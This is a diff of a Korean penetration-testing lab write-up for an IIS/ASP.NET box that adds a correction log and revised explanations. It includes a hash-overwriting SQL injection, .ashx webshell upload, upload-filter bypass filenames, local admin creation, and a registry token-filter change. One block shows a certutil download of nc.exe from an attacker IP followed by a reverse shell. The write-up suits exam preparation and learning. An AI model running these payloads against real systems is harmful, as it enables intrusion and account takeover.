@@ -24,13 +24,35 @@ tech_count: 5
 > **타겟** 192.168.243.63 · **OS** Windows Server 2019 (`butch`, IIS 10.0 / ASP.NET 4.0.30319) · **플래그 2개**
 > **경로 요약** **450번 포트**의 IIS 웹앱 → `/dev/` **디렉터리 리스팅 + 소스 노출**(`.txt` 확장자) → 로그인 폼 **스택 쿼리 SQLi로 비밀번호 해시 덮어쓰기** → `butch`로 로그인 → **`.ashx` 웹셸 업로드** → 앱풀이 특권 신원이라 **곧바로 `net user /add`** → 로컬 관리자 계정 생성 → **evil-winrm** → 토큰 필터링 우회 후 `proof.txt`
 
+> [!warning] 적대적 검증 정정 이력 (2026-08-20)
+> 이 노트는 외부 근거(OSCP Exam Guide 원문 · IIS/ASP.NET 기본 설정 · Kali 원본 로그)와 대조하는 적대적 검증을 거쳤다. **틀렸던 것과 왜 틀렸는지**를 남긴다 — 같은 오해를 반복하지 않기 위해서다.
+>
+> | # | 무엇이 틀렸었나 | 왜 틀렸나 | 어디 |
+> |---|---|---|---|
+> | 1 | **웹셸로 `proof.txt` 읽기를 "최선"으로 권장** | 정반대다. OSCP는 **웹 기반 셸로 얻은 플래그를 0점 처리**한다. 시험장에서 박스 하나를 통째로 날리는 함정 | 4장 · 7장 #16·#17 |
+> | 2 | `.master`/`.cs` 가 IIS에서 "컴파일·실행된다" | 실제로는 **거부된다**(404.7 / 403). `HttpForbiddenHandler` + requestFiltering. `.txt` 사본이 필요했던 이유의 메커니즘이 통째로 뒤집혀 있었다 | 0장 · 2-1 |
+> | 3 | "OSCP 시험 규정은 타겟 변조를 금한다"를 **따옴표로 인용** | **그런 조항이 없다.** Exam Guide/FAQ/Academic Policy 전문에 타겟 변조·파일 삭제 금지 조항 부재. 진짜 리스크는 규정 위반이 아니라 **revert로 인한 진척 손실** | 4장 |
+> | 4 | "다른 응시자의 재현을 방해한다" | 시험 환경은 **응시자 전용 private VPN**이다. 이 통념의 출처는 **은퇴한 통합 PWK 랩**(당시엔 공유 환경이 맞았다) | 2-4 · 4장 |
+> | 5 | RID 500 경로 조건 "비밀번호를 안다"가 실제 진행과 모순 | 이 박스는 비밀번호를 **몰랐고 덮어썼다** | 4장 |
+> | 6 | 업로드 필터 유무가 노트 안에서 3중으로 엇갈림 | 원본 기록에 **필터 언급도 실패 시도도 없다.** "필터 있음" 단정 → `[가정]`으로 통일 | 0장 · 2 · 2-6 |
+> | 7 | `SeImpersonatePrivilege` 를 "최신 패치 유지"로 막는다 | MS는 이를 **설계상 동작**으로 취급한다. PrintSpoofer/EfsPotato/GodPotato는 패치로 안 막힌다 | 8장 #9 |
+> | 8 | `net user /add` 를 30행 간격으로 "가장 시끄럽다" ↔ "안전하다" | **"안전"이 오기**다. 아웃바운드 회피라는 이점과 로그 소음은 별개 축이다 | 3장 |
+> | 9 | 실행하지 않은 SHA-256 검산을 **Kali 프롬프트를 붙여 실행 기록처럼** 제시 | 값은 정확하나 세션은 없었다 → **검산 절차**로 표기 변경 | 2-5 |
+> | 10 | MSSQL 확정에 **노트 내 관측 근거가 없다** | 추론은 강하지만 관측이 아니라 **연역**이다 → `[가정]` 표기 | 2-2 · 2-3 |
+> | 11 | "플래그 값만 있으면 0점"의 **이유가 틀렸다** | 규정이 요구하는 것은 `whoami`/`hostname` 이 아니라 **대화형 셸 + 타겟 IP**다 | 5장 · 7장 #18 |
+> | 12 | `shell.aspx:.jpg` 를 동작하는 웹셸로 제시 | ADS로 쓰면 **기본 스트림이 0바이트**가 된다. 필터 통과용이지 단독으로는 실행 불가 | 2-6 |
+> | 13 | `nnmap` 을 "오타"로 단정 | 원본 `nmap.log` 1행에 **실제 명령이 남아 있다**. 오타가 아니라 별칭/래퍼 | 1장 |
+> | 14 | 인바운드 필터링에서 **아웃바운드를 추정** | 두 정책은 독립이다. 이 박스는 리버스셸을 아예 쓰지 않아 아웃바운드가 검증된 바 없다 | 3장 |
+>
+> **검증했으나 정확했던 것**(그대로 둔다): 스택 쿼리 가부 매트릭스 · `LocalAccountTokenFilterPolicy` + RID 500 예외 · `/App_Data/` 실행 거부 · IIS 디렉터리 브라우징 기본 비활성 · T-SQL `--` 후행 공백 불필요 · 해시 길이 판정 · hashcat `-m 1400`/`-m 0` · 이벤트 ID 4720/4732 · **sqlmap 금지** · §2-5 MSSQL 수동 페이로드 문법.
+
 ## 0. 이 박스에서 배우는 것
 
 - **웹은 80/443에만 있지 않다** — 이 박스의 웹은 **450번**이다. 전 포트 스캔을 안 하면 시작조차 못 한다
-- **소스 코드 노출의 전형** — 개발자가 `.cs`/`.master` 를 `.txt`로 복사해 두면 IIS는 그것을 **실행하지 않고 평문으로 뱉는다**
+- **소스 코드 노출의 전형** — `.cs`/`.master` 는 IIS가 **거부한다**(실행도 서빙도 안 한다). 그런데 개발자가 `.txt`로 복사해 두면 IIS는 그것을 **정적 파일로 취급해 원문 그대로 뱉는다** — `.txt` 사본이 **유일한 소스 유출 경로**였다
 - **SQL 인젝션은 "읽기"만이 아니다** — 데이터를 빼내는 대신 **`UPDATE`로 비밀번호 해시를 덮어써서** 로그인하는 쓰기형 공격
 - **왜 MSSQL/ADO.NET에서는 스택 쿼리(`; ...; --`)가 통하는가** — MySQL/JDBC와 결정적으로 다른 지점
-- **`.ashx` 웹셸** — 업로드 필터가 `.aspx`만 막고 `.ashx`를 잊는 전형
+- **`.ashx` 웹셸** — 업로드 필터 블랙리스트에서 **자주 누락되는 확장자**. (이 박스에 필터가 실제로 있었는지는 **기록에 없다** — 2-6 참조)
 - **Windows 로컬 계정 + WinRM의 토큰 필터링** — 관리자 그룹에 넣었는데 `whoami /priv`가 초라한 이유
 
 > [!tip] 시험 출제 가능성
@@ -120,8 +142,18 @@ Nmap done: 1 IP address (1 host up) scanned in 105.69 seconds
 > `Potentially risky methods: TRACE`는 nmap이 늘 붙이는 저위험 지적이다. Cross-Site Tracing은 최신 브라우저에서 `XMLHttpRequest`가 TRACE를 막아 사실상 죽은 공격이다.
 > **시험에서 이 줄을 보고 시간을 쓰지 마라.** 리포트의 "Low" 항목으로 한 줄 적고 넘어가는 것이 정답이다.
 
-> [!note] [가정] 실제 실행한 명령
-> 원문에는 `nnmap 192.168.243.63`으로 적혀 있으나, 출력에 **OS 추정·traceroute·65528 filtered·서비스 버전**이 모두 들어 있다. 이는 최소한 `-p- -A`(또는 `-sCV -O`) 조합이어야 나오는 결과다. 기록 시 오타로 보이며, **재현할 때는 아래를 쓴다**:
+> [!note] 실제 실행한 명령 — `nnmap` 은 오타가 아니다
+> `nmap.log` 첫 줄에 **실제 명령이 그대로 남아 있다**:
+> ```
+> # Nmap 7.98 scan initiated Tue Aug 18 10:48:59 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.243.63
+> ```
+> `nnmap` 은 오타가 아니라 **사용자 정의 별칭**이다. Kali `~/.zshrc:247` 에서 정의를 직접 확인했다:
+> ```sh
+> alias nnmap='nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log'
+> ```
+> [[Squid]] 박스에서도 같은 플래그셋이 쓰인 것이 이 별칭 때문이다.
+> ⚠️ 다만 별칭에 `-oN nmap.log` 가 **박혀 있다**는 점에 주의하라 — 작업 디렉터리를 안 바꾸고 다음 박스를 스캔하면 **이전 박스의 로그를 덮어쓴다.**
+> 재현할 때는 아래를 쓴다(위 명령과 동일):
 > ```bash
 > sudo nmap -sCV -A -p- -Pn --min-rate 5000 -oN nmap.log 192.168.243.63
 > ```
@@ -248,7 +280,7 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 > |---|---|---|
 > | ① | `/dev/` **디렉터리 리스팅 + 소스 노출** | 앱 내부 구조 · 해시 방식 |
 > | ② | 로그인 폼 **스택 쿼리 SQL 인젝션** | 인증 우회 (butch 계정 탈취) |
-> | ③ | 인증 후 **임의 확장자 파일 업로드** + 업로드 경로가 **실행 가능** | RCE |
+> | ③ | 인증 후 **실행 가능한 확장자 파일 업로드** + 업로드 경로가 **실행 가능** | RCE |
 > | ④ | **IIS 앱풀이 특권 신원**으로 구동 | 곧바로 로컬 관리자 |
 >
 > 하나라도 끊기면 체인이 죽는다. **역으로, 하나가 막히면 어디를 다시 봐야 하는지도 이 표가 알려준다.**
@@ -261,17 +293,40 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 IIS에서 디렉터리 리스팅(Directory Browsing)은 **기본 비활성**이다. 켜져 있다는 것은 개발자가 **의도적으로 켰다**는 뜻이고, 그런 디렉터리에는 대개 **배포되면 안 되는 것**이 들어 있다.
 
-> [!note] 왜 개발자는 `/dev/`를 만드는가 — 그리고 왜 항상 새는가
-> ASP.NET WebForms에서 `.aspx`·`.master`·`.ashx`는 **IIS 핸들러가 가로채 컴파일해서 실행**한다. 브라우저로 열면 **소스가 아니라 렌더링 결과**만 보인다.
-> 그런데 파일을 **`.txt`로 복사해 두면** 확장자 매핑이 없으므로 IIS는 그것을 **정적 파일**로 취급해 **원문 그대로 뱉는다.**
-> 개발자는 "동료에게 코드 보여주려고" 이렇게 한다. 공격자에게는 **화이트박스 리뷰의 문이 열린 것**이다.
+> [!note] 왜 개발자는 `/dev/`를 만드는가 — 그리고 왜 `.txt` 사본만이 소스를 유출하는가
+> ASP.NET의 확장자는 **셋 중 하나로 처리된다.** 이 구분이 이 박스 체인의 출발점이다.
+> | 확장자 | IIS/ASP.NET 처리 | 브라우저로 원문이 보이는가 |
+> |---|---|---|
+> | `.aspx` · `.ashx` · `.asmx` | **핸들러가 가로채 컴파일·실행** (`PageHandlerFactory` / `SimpleHandlerFactory`) | **아니다** — 렌더링 결과만 |
+> | `.master` · `.cs` · `.config` · `.asax` | **거부된다** (`HttpForbiddenHandler`) | **아니다** — 에러만 |
+> | `.txt` · `.bak` · `.old` · `~` | 매핑 없음 → **정적 파일**로 서빙 | **그렇다 — 원문 그대로** |
 >
-> **일반화: IIS/ASP.NET 타겟을 만나면 실행 확장자에 정적 확장자를 덧붙여 전수로 찔러라.**
+> 근거는 프레임워크 기본 설정 파일이다 — `%windir%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config`:
+> ```xml
+> <add path="*.aspx"   type="System.Web.UI.PageHandlerFactory" />
+> <add path="*.ashx"   type="System.Web.UI.SimpleHandlerFactory" />
+> <add path="*.master" type="System.Web.HttpForbiddenHandler" />
+> <add path="*.cs"     type="System.Web.HttpForbiddenHandler" />
+> ```
+> 게다가 IIS7+ 기본 `applicationHost.config` 의 요청 필터링이 한 겹 더 있다:
+> ```xml
+> <requestFiltering>
+>   <fileExtensions>
+>     <add fileExtension=".master" allowed="false" />
+>     <add fileExtension=".cs"     allowed="false" />
+> ```
+> **실제 응답은 HTTP `404.7 — File extension denied`** 다. 요청 필터링을 제거한 경우에만 그 아래 ASP.NET 층의 **`403 — This type of page is not served`** 에 도달한다.
+>
+> **그래서 `.txt` 사본이 유일한 소스 유출 경로였다.** 개발자는 "동료에게 코드 보여주려고" `.txt`로 복사한다. 그 순간 **화이트박스 리뷰의 문이 열린다.**
+>
+> **일반화: IIS/ASP.NET 타겟을 만나면 실행/거부 확장자 뒤에 정적 확장자를 덧붙여 전수로 찔러라.**
 > ```
 > default.aspx.txt   default.aspx.bak   default.aspx.old   default.aspx~
 > web.config.txt     web.config.bak     global.asax.txt
-> login.aspx.cs      site.master.txt    *.zip  *.rar  *.7z
+> site.master.cs.txt site.master.txt    login.aspx.cs.bak
+> *.zip  *.rar  *.7z
 > ```
+> ⚠️ **`login.aspx.cs` 자체를 요청하는 것은 의미가 없다** — 위 표대로 `.cs`는 거부된다(404.7). **덧붙이는 정적 확장자가 핵심**이다. 확장자 사본이 없다면 남은 경로는 **다운로드/뷰어 엔드포인트**(`download.aspx?file=`)나 **경로 순회**뿐이다.
 > 같은 계열: PHP의 `index.php.bak`, Java의 `WEB-INF/web.xml`, Node의 `.env`, 그리고 [[Hawat]]의 노출된 소스 zip.
 
 `site.master.txt`
@@ -314,13 +369,14 @@ IIS에서 디렉터리 리스팅(Directory Browsing)은 **기본 비활성**이�
 | 조각 | 알려주는 것 |
 |---|---|
 | `Language="C#"` | 코드비하인드가 **C#**. VB.NET이 아니다 |
-| `src="site.master.cs"` | **`.cs` 원본이 웹루트에 함께 놓여 있다.** `/dev/site.master.cs` 를 직접 요청할 후보 |
+| `src="site.master.cs"` | **`.cs` 원본이 웹루트에 함께 놓여 있다.** 단 `/dev/site.master.cs` 를 직접 요청해봐야 **반드시 실패한다**(404.7 — `.cs`는 거부 확장자). 노려야 할 것은 **핸들러 파이프라인을 우회하는 사본** — `site.master.cs.txt` · `.bak` · `.old` · `site.master.cs~` |
 | `Inherits="MyNamespaceMaster.MyClassMaster"` | 네임스페이스/클래스명. 다른 페이지의 코드비하인드 이름을 추측하는 재료 |
 | `<asp:contentplaceholder id="ContentPlaceHolder1">` | whatweb이 본 `ctl00$ContentPlaceHolder1$PasswordTextBox`의 **출처가 확인됐다** — 독립 근거 2개 일치 |
 
 > [!tip] `src=` 속성은 **컴파일 시점 컴파일**을 뜻한다
 > 일반 WebForms는 `CodeBehind="x.aspx.cs"` + 미리 컴파일된 DLL(`/bin/`)을 쓴다. 여기처럼 `src=`를 쓰면 **`.cs` 파일이 웹루트에 실제로 존재하고 런타임에 컴파일**된다.
-> 즉 **`.cs` 원문이 서버 어딘가에 반드시 있다.** 디렉터리 리스팅이 켜진 `/dev/`에서 나머지 `.cs`/`.txt`를 전부 받아 읽는 것이 다음 수순이다.
+> 즉 **`.cs` 원문이 서버 어딘가에 반드시 있다.** 하지만 **HTTP로 그 파일을 직접 받을 수는 없다** — `.cs`는 요청 필터링과 `HttpForbiddenHandler`에 이중으로 막힌다.
+> **그래서 다음 수순은 `.cs` 요청이 아니라 `/dev/` 리스팅을 눈으로 훑어 `.txt`·`.bak` 사본을 찾는 것**이다. 디렉터리 리스팅이 켜져 있다는 사실이 여기서 값을 한다 — 어떤 사본이 존재하는지 추측할 필요 없이 목록으로 보이기 때문이다.
 
 ### 2-2. 취약점 ② — 로그인 폼 SQL 인젝션
 
@@ -353,12 +409,21 @@ id 입력창에 작은따음표 입력 ' 시 에러 발생
 > **`'` 하나로 에러가 났다고 바로 페이로드를 던지지 마라.** `''`로 에러가 사라지는지 확인하는 1초가 오탐(단순 500 에러 페이지)을 걸러낸다.
 
 > [!danger] 여기서 에러 메시지를 **읽어야** 다음이 열린다
-> ASP.NET의 노란 에러 페이지(Yellow Screen of Death)에는 보통 다음이 그대로 찍힌다:
-> - **예외 타입** — `System.Data.SqlClient.SqlException` → **백엔드가 Microsoft SQL Server**임이 확정된다(MySQL이면 `MySql.Data.MySqlClient.MySqlException`)
+> ASP.NET의 노란 에러 페이지(Yellow Screen of Death)에는 **일반적으로** 다음이 그대로 찍힌다 — 아래는 이 박스의 관측이 아니라 **읽는 법의 일반론**이다:
+> - **예외 타입** — `System.Data.SqlClient.SqlException` 이면 백엔드는 Microsoft SQL Server다(MySQL이면 `MySql.Data.MySqlClient.MySqlException`, Oracle이면 `Oracle.ManagedDataAccess.Client.OracleException`)
 > - **에러 원문** — `Invalid column name 'xxx'` / `Incorrect syntax near ...`
 > - **스택 트레이스** — 코드비하인드 파일 경로와 줄 번호
 >
 > **백엔드 DBMS 판정이 페이로드 문법을 통째로 결정한다.** 아래 2-3이 그 이야기다.
+
+> [!warning] **[가정]** 이 박스의 DBMS 판정은 **관측이 아니라 연역**이다
+> 이 노트에는 **에러 메시지 원문이 한 번도 실려 있지 않다**(스크린샷 링크뿐이고, 원본 기록에도 DBMS를 확정하는 출력이 없다). 그러므로 "`SqlException`을 눈으로 봤다"고 적으면 그것은 사실이 아니다.
+> **판정 근거는 스크린샷의 예외 타입으로 MSSQL이라고 본 것이고, 이를 뒷받침하는 방증은 셋이다:**
+> 1. **IIS 10 + ASP.NET 4.0 WebForms** — 이 스택의 기본 데이터 접근은 `System.Data.SqlClient`(MSSQL)
+> 2. **세미콜론 스택 쿼리가 실제로 성립했다** — 아래 2-3 표대로 MySQL+PHP/JDBC였다면 실패했을 것이다
+> 3. **후행 공백 없는 `--` 가 주석으로 동작했다** — MySQL이라면 `-- `(공백 필수)여야 한다
+>
+> 셋이 전부 MSSQL을 가리키므로 **결론은 사실상 확정에 가깝다.** 그러나 **"확정"과 "강한 추론"을 표기로 구분하는 습관** 자체가 시험 리포트에서는 자산이다 — 채점자는 근거의 출처를 본다.
 
 ### 2-3. 왜 스택 쿼리(`; ... ; --`)가 통하는가 — 이 박스의 핵심 원리
 
@@ -398,7 +463,7 @@ id 입력창에 작은따음표 입력 ' 시 에러 발생
 | `'` | 원 쿼리의 **문자열 리터럴을 조기 종료**. 이 시점에서 커서는 SQL 문법 위에 선다 | 입력이 그냥 데이터로 남는다 |
 | `;` | **문장 경계**. 앞의 `SELECT ... WHERE username = ''` 를 끝내고 새 문장을 연다 | 이어붙은 `update`가 `SELECT`의 일부로 해석되어 구문 에러 |
 | `update users set password_hash='...'` | **본체**. 저장된 해시를 내가 아는 값으로 교체 | — |
-| `where username = 'butch'` | **대상 한정** | **테이블 전체의 비밀번호가 날아간다.** 박스가 망가지고, 시험이라면 다른 응시자/재현성까지 파괴한다 |
+| `where username = 'butch'` | **대상 한정** | **테이블 전체의 비밀번호가 날아간다.** 앱의 다른 계정으로 돌아갈 길이 끊기고, **채점 재현과 본인의 재접근 가능성**까지 함께 죽는다. 되돌릴 방법은 revert뿐인데 revert하면 그 머신의 진척이 전부 사라진다 |
 | `; --` | 뒤에 남은 원 쿼리 잔여물(`'`)을 **주석 처리** | 닫히지 않은 따옴표가 남아 구문 에러 |
 
 > [!warning] T-SQL의 `--` 는 MySQL과 다르다 — **뒤 공백이 필요 없다**
@@ -422,19 +487,31 @@ id 입력창에 작은따음표 입력 ' 시 에러 발생
 
 ### 2-5. 그 해시값은 어디서 왔는가 — `48f9460f...` 의 정체
 
-**확정 사실:** `48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0` 은 **`butch` 라는 문자열의 SHA-256**이다. 재현 가능하다:
+**확정 사실:** `48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0` 은 **`butch` 라는 문자열(소문자, 개행 없음)의 SHA-256**이다.
 
-```bash
-┌──(kali㉿kali)-[~/PG/Butch]
-└─$ echo -n 'butch' | sha256sum
-48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0  -
-```
+> [!note] 검산 절차 — 이 값이 무엇의 해시인지 확인하는 법
+> 아래는 **당시 세션 기록이 아니라 검산 절차**다(원본 작업 로그에는 이 계산이 남아 있지 않다). 값은 재계산으로 일치를 확인했다.
+> ```bash
+> echo -n 'butch' | sha256sum
+> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0  -
+> ```
+> ```powershell
+> $s=[System.Security.Cryptography.SHA256]::Create()
+> ($s.ComputeHash([Text.Encoding]::UTF8.GetBytes('butch'))|%{$_.ToString('x2')}) -join ''
+> 48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0
+> ```
 
-```powershell
-PS> $s=[System.Security.Cryptography.SHA256]::Create()
-PS> ($s.ComputeHash([Text.Encoding]::UTF8.GetBytes('butch'))|%{$_.ToString('x2')}) -join ''
-48f9460fe0dc9f272e7414963dd2b52287ec07d872d665d2e9364c957f163ab0
-```
+> [!danger] `echo -n` 의 `-n` 이 없으면 **전혀 다른 해시가 나온다** — 시험에서 실제로 태우는 시간
+> 같은 단어인데 **개행 한 바이트·대소문자 하나**로 값이 완전히 달라진다. 이 대비를 눈에 익혀 둬라:
+> | 입력 | SHA-256 |
+> |---|---|
+> | `butch` (개행 없음) | `48f9460f…f163ab0` ← **이 박스가 심은 값** |
+> | `butch\n` (`echo` 기본) | `141714383b1614e77057017a9d38eaf033724353a1d9a8c25cbf57566faf51cd` |
+> | `Butch` | `7e4a6c94d902af155773c2c8c6c115e5414716c276b34f347b98e82d2a22c37e` |
+> | `BUTCH` | `faf32403fa9556a16f621d8c764586b4c0dcd9ce2d1a9fb4ed053d598bfa61d6` |
+>
+> 넷이 전부 다르므로 이 박스의 평문이 **소문자 `butch` + 개행 없음**임이 역으로 확정된다.
+> **반사 규칙:** 해시를 만들 때는 `echo -n`(또는 `printf`)을 쓴다. 심은 해시로 로그인이 안 되면 **페이로드를 의심하기 전에 개행부터 의심하라.** PowerShell의 `[Text.Encoding]::UTF8.GetBytes()` 는 개행을 붙이지 않으므로 이 함정이 없다.
 
 즉 공격은 **"butch 계정의 비밀번호를 `butch`로 바꾼다"** 였고, 이후 `butch` / `butch` 로 로그인한 것이다.
 
@@ -518,20 +595,21 @@ https://github.com/yangbaopeng/ashx_webshell/blob/master/shell.ashx
 > **`.aspx` 대비 장점 셋:**
 > 1. **디자이너 파일·마스터 페이지가 필요 없다.** 한 파일로 완결 → 업로드 한 번이면 끝
 > 2. **업로드 필터 블랙리스트에서 자주 누락된다.** 대부분 `.asp`·`.aspx`·`.php`·`.jsp`까지만 막는다
-> 3. IIS의 `SimpleHandlerFactory` 매핑이 **기본으로 켜져 있다** — 별도 설정 없이 실행된다
+> 3. IIS의 `SimpleHandlerFactory` 매핑이 **기본으로 켜져 있다** — 별도 설정 없이 실행된다. 통합 파이프라인의 핸들러 항목은 `verb="GET,HEAD,POST,DEBUG"` 로 등록돼 있다(`verb="*"` 가 아니다). **웹셸이 `POST`로 명령을 받는다면 문제없지만, `PUT`/`OPTIONS` 같은 메서드를 기대하는 페이로드는 이 매핑에 걸리지 않는다**
 >
-> **[가정]** 이 박스가 `.aspx`를 막았는지는 기록에 없다. 다만 `.ashx`를 고른 것은 위 이유로 합리적인 첫 선택이다.
+> **[가정] 이 박스가 `.aspx`를 막았는지는 기록에 없다.** 업로드 필터의 존재를 시사하는 기록도, `.aspx` 업로드가 거부된 흔적도 원본에 남아 있지 않다. `.ashx`를 고른 것은 **필터를 확인해서가 아니라 위 세 이유로 합리적인 첫 선택이었기 때문**으로 읽는 것이 정확하다.
 
 > [!tip] IIS 업로드 필터 우회 사다리 — 위에서부터 순서대로
 > | 시도 | 노리는 허점 |
 > |---|---|
 > | `shell.aspx` | 필터 없음 |
-> | `shell.ashx` / `shell.asmx` | 블랙리스트 누락 (**이 박스**) |
+> | `shell.ashx` / `shell.asmx` | 블랙리스트 누락 (**이 박스에서 사용 — 다만 필터 유무 자체는 미확인**) |
 > | `shell.AspX` / `shell.ASHX` | **대소문자** 비교 누락 (Windows FS는 대소문자 무시 → 실행됨) |
 > | `shell.aspx.txt` → `shell.txt.aspx` | 확장자 파싱 방향 착각 |
 > | `shell.aspx%00.jpg` | 널바이트 절단 (구형 .NET) |
 > | `shell.aspx.` / `shell.aspx ` | **후행 점/공백** — Windows가 저장 시 제거한다 |
-> | `shell.aspx:.jpg` | **NTFS ADS**(대체 데이터 스트림) |
+> | `shell.aspx:.jpg` | **NTFS ADS**(대체 데이터 스트림) — ⚠️ **단독으로는 불충분**. 본문이 `.jpg` 대체 스트림에 들어가고 실제로 실행되는 **기본 스트림은 0바이트**가 된다. 필터 통과 확인용이지 동작하는 웹셸이 아니다 |
+> | `shell.asp::$DATA` | **NTFS ADS의 고전형** — `::$DATA` 는 **기본 스트림 자체를 가리키는 별칭**이라 본문이 정상 위치에 들어간다. 확장자 비교만 하는 필터를 통과하면서 **실행까지 되는 쪽은 이것**이다 |
 > | `web.config` 업로드 | 필터가 실행 확장자만 볼 때. `web.config` 자체가 **핸들러를 새로 정의**해 `.jpg`를 실행시킬 수 있다 |
 > | `../` 를 파일명에 삽입 | 경로 순회로 웹루트에 직접 배치 |
 >
@@ -599,9 +677,11 @@ net localgroup "Remote Management Users" 4leaf /add
 > certutil -urlcache -split -f http://192.168.45.207/nc.exe C:\Windows\Temp\nc.exe
 > C:\Windows\Temp\nc.exe 192.168.45.207 443 -e cmd.exe
 > ```
-> **리버스셸이 안 붙으면 아웃바운드 포트를 의심하라.** 이 박스는 인바운드가 65528포트 filtered일 정도로 방화벽이 촘촘하다 — 나가는 방향도 제한될 가능성이 높다. **443 → 80 → 53 순으로 시도**한다. ([[Hawat]]에서 실제로 이 함정에 걸렸다)
+> **리버스셸이 안 붙으면 아웃바운드 포트를 의심하라.** **443 → 80 → 53 순으로 시도**한다.
+> ⚠️ **[가정] 이 박스의 아웃바운드 정책은 미확인이다.** 리버스셸을 아예 쓰지 않았으므로 검증된 바가 없다. **인바운드 정책(65528포트 filtered)에서 아웃바운드를 추정하지 마라 — 둘은 서로 독립된 규칙 집합이다.** 인바운드를 전부 막고 아웃바운드는 열어두는 구성이 오히려 흔하다.
+> 반면 [[Hawat]]에서는 **`443/tcp closed`** 라는 실제 단서가 있었고, 거기서 이 함정에 실제로 걸렸다. **추정의 근거가 되는 것은 실제 관측이지 다른 방향의 정책이 아니다.**
 >
-> **이 박스는 ①을 택해 리버스셸 문제를 통째로 회피했다.** 5985(WinRM)가 이미 열려 있는 것을 nmap에서 확인했기 때문에 가능한 판단이다. **인바운드로 관리 포트가 열려 있으면 리버스셸보다 계정 생성이 안전하고 빠르다.**
+> **이 박스는 ①을 택해 리버스셸 문제를 통째로 회피했다.** 5985(WinRM)가 이미 열려 있는 것을 nmap에서 확인했기 때문에 가능한 판단이다. **인바운드로 관리 포트가 열려 있으면 계정 생성 경로가 리버스셸의 아웃바운드 제약을 통째로 우회하므로 빠르고 안정적이다** — 다만 §2-7에서 짚은 대로 **로그상으로는 가장 시끄러운 방법**이다(4720·4732). 랩에서만 쓰는 지름길이지, 조용한 방법이 아니다.
 
 ---
 
@@ -642,15 +722,30 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 >
 > **증상 인식법: `whoami /groups`에 `BUILTIN\Administrators`가 보이는데 `whoami /priv`는 초라하다 → 토큰 필터링이다.** "그룹 추가가 실패했나?" 하고 되돌아가지 마라.
 
-> [!tip] 토큰 필터링을 넘는 4가지 — 상황별 선택
+> [!tip] 토큰 필터링을 넘는 4가지 (+ 시험에서 쓰면 안 되는 1가지) — 상황별 선택
 > | 방법 | 명령 | 조건 |
 > |---|---|---|
-> | **① 내장 Administrator(RID 500)로 붙는다** | `evil-winrm -u administrator -p '...'` | 그 계정의 비밀번호를 안다. **이 박스가 택한 길** |
-> | ② 레지스트리로 필터링 해제 | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f` | 관리자 권한 필요 → **특권 웹셸에서 실행**하면 된다. 설정 변경이라 흔적이 남는다 |
-> | ③ **필터링되지 않는 채널을 쓴다** | 특권 웹셸에서 직접 명령 | 웹셸의 앱풀 토큰은 애초에 필터링 대상이 아니다. **가장 조용하다** |
+> | **① 내장 Administrator(RID 500)로 붙는다** | `evil-winrm -u administrator -p '...'` | 그 계정의 비밀번호를 **알거나, 특권 채널에서 재설정할 수 있다.** **이 박스가 택한 길**(비밀번호를 몰랐으므로 **재설정**해서 — 아래 참조) |
+> | ② 레지스트리로 필터링 해제 | `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f` | 관리자 권한 필요 → **특권 웹셸에서 실행**하면 된다. **`/d 0` 으로 원복 가능** — 시험에서 쓰기에 가장 안전한 축 |
+> | ③ SAM/SYSTEM 덤프 → **pass-the-hash** | `reg save HKLM\SAM …` → `secretsdump.py` → `evil-winrm -H <NTLM>` | 특권 채널 필요. **아무것도 변경하지 않는다.** RID 500 해시로 붙으면 필터링도 없다 |
 > | ④ 도메인 계정 사용 | — | 도메인 계정은 기본적으로 필터링되지 않는다 (도메인 환경 한정) |
+> | ~~⑤ 특권 웹셸에서 직접 명령~~ | ~~웹셸에서 `type proof.txt`~~ | **⚠️ 랩 한정.** 웹셸의 앱풀 토큰은 애초에 필터링 대상이 아니어서 기술적으로는 성립하지만, **OSCP 시험에서는 이 경로로 얻은 플래그가 0점이다** — 바로 아래 콜아웃 |
 >
 > **`net localgroup administrators <user> /add` 를 했는데 WinRM에서 권한이 없다면 ②나 ③을 반사적으로 떠올려라.** 시험에서 여기서 막혀 30분을 태우는 사람이 많다.
+
+> [!danger] ⚠️ **웹셸로 플래그를 읽으면 0점이다** — 이 노트가 원래 정반대로 적고 있었다
+> 위 표의 ⑤(특권 웹셸에서 직접 `type proof.txt`)는 **랩에서만 쓰는 지름길**이다. 시험에서는 그 박스의 점수를 통째로 날린다.
+> > "The valid way to provide the contents of the proof files is in an **interactive shell** on the target machine with the type or cat command from their original location."
+> > "Obtaining the contents of the proof files in any other way will result in **zero points** for the target machine; **this includes any type of web-based shell**."
+> > — [OSCP Exam Guide, "Exam Proofs"](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
+>
+> **웹셸은 "명령이 실행되는 채널"이지 "대화형 셸"이 아니다.** 규정은 이 둘을 명시적으로 구분한다. 웹셸에서 플래그를 읽어 스크린샷을 찍는 것은 **가장 쉽고 가장 비싼 실수**다 — 기술적으로는 박스를 풀었는데 점수는 0이 된다.
+>
+> **웹셸의 올바른 용도는 "플래그를 읽는 것"이 아니라 "대화형 셸을 얻는 특권 작업을 실행하는 것"이다.** 즉 위 표의 ②·③을 **웹셸에서 실행하고**, 플래그는 그 결과로 얻은 evil-winrm/RDP 세션에서 읽는다.
+>
+> **시험용 유효 대안은 둘뿐이고, 이 박스의 기록에 둘 다 이미 등장한다:**
+> 1. **`LocalAccountTokenFilterPolicy=1` 토글** (웹셸에서 실행) → `4leaf` 로 evil-winrm 재접속하면 **필터링 없는 전체 토큰** → 대화형 셸에서 `type proof.txt`. **끝나면 `/d 0` 으로 원복한다**
